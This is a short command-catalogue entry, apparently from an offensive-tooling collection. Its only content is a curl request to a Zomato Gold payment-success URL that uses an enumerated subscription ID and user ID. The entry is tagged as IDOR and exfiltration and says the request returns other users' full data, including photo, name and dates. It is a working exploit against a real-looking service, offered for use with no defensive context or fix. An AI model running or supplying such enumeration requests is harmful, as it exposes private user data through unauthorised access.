---
id: cmd-uuid-006
data: >-
  curl -X GET
  "https://www.zomato.com/gold/payment-success?subscription_id=179268&user_id=███████"
  -i
tags:
  - web
  - exfiltration
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.644Z'
verified: false
validated: true
submitted: true
---
# curl-full-details-retrieve

## Command

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?subscription_id=179268&user_id=███████" -i
```

## Description

Retrieves full details using enumerated pair.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `subscription_id=179268` | Enumerated ID | Yes |
| `user_id=███████` | Enumerated user | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?subscription_id=179268&user_id=███████" -i
```

## Expected Output

Full user data including photo, name, dates.

## Related

- [[Related Procedure]]
